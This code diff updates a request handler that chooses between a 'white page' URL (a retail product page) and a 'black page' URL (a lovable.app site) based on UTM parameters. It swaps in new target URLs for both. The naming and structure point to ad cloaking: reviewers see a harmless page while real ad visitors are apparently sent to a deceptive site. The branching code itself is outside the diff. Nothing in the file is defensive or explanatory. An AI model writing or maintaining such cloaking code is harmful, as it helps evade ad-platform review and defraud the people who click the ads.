@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://toyscentral.dk/products/microfleur-max-microwave-flower-press-kit-diy-craft-kit-for-adults-kids-crafting-gifts-floral-art-creativity-pressing-flowers-making-pressed-flowers-crafty-gift-for-plant-lovers-9-23-cm";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.trendyol.com/en/valentino/brixton-taupe-259-p-941948861";
+    const blackPageURL = "https://casssshlov.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,3 +26,4 @@ export default function handler(req, res) {
     res.end();
 
   }
+
